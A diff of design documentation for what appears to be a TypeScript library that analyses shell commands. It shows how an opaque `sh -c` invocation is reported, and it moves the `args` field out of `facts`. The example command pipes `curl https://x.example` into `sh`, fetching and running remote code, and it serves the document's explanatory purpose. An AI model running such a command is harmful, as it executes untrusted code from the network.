@@ -64,11 +64,11 @@ opaque fact set has **no `effect` field at all**. It has `effectAtLeast`, and `h
 to, in the same plain register as `says`:
 
 ```ts
-const { facts } = explain({ program: '/bin/sh', argv: ['sh', '-c', 'curl https://x.example | sh'] })
+const { facts, args } = explain({ program: '/bin/sh', argv: ['sh', '-c', 'curl https://x.example | sh'] })
 facts.effect       // type error: a complete effect list is not available on an opaque command
 effectsOf(facts)   // ['execute'] — the floor, reached deliberately
 facts.handsOverTo  // 'the commands it was given, which are not shown here'
-facts.args         // [{ index: 2, value: 'curl https://x.example | sh', role: 'command' }]
+args               // [{ index: 2, value: 'curl https://x.example | sh', role: 'command', flag: '-c' }]
 ```
 
 Reading a complete effect list off an opaque command has to be a type error rather than a quiet mistake. Handing over
